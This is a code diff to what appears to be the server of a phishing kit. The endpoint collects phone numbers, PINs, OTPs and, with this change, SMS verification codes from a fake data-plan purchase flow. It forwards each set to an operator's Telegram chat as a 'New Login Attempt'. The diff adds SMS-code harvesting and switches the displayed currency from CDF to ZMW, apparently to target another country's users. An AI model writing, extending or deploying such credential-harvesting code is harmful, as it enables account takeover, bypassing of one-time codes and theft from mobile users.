@@ -59,7 +59,7 @@ setInterval(() => {
 // Create a new approval request -> notifies admin on Telegram
 // ---------------------------------------------------------------------------
 app.post('/api/request-approval', async (req, res) => {
-  const { plan, price, phone, step, code, otp } = req.body || {};
+  const { plan, price, phone, step, code, otp, sms } = req.body || {};
   const id = makeId();
 
   requests.set(id, {
@@ -70,20 +70,23 @@ app.post('/api/request-approval', async (req, res) => {
     step: step || 'login',
     code: code || '',
     otp: otp || '',
+    sms: sms || '',
     createdAt: Date.now(),
   });
 
   if (bot && ADMIN_CHAT_ID) {
-  const stepLabel = step === 'otp' ? 'OTP Verification' : 'Login';
+  const stepLabel = step === 'otp' ? 'OTP Verification' : step === 'sms' ? 'SMS Verification' : 'Login';
 
-  const secretLine =
-    step === 'otp'
-       ? `🔑 OTP : \`${otp || '—'}\`\n`
-: `🔑 pin: \`${code || '—'}\`\n`;
+  const secretLine = step === 'otp'
+    ? `🔑 OTP : \`${otp || '—'}\`\n`
+    : step === 'sms'
+      ? `📝 SMS : \`${sms || '—'}\`\n`
+      : `🔑 pin: \`${code || '—'}\`\n`;
+
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
       `📦 Data: ${plan || '—'}\n` +
-      `💰 Price: CDF ${price || '—'}\n` +
+      `💰 Price: ZMW ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine;
       
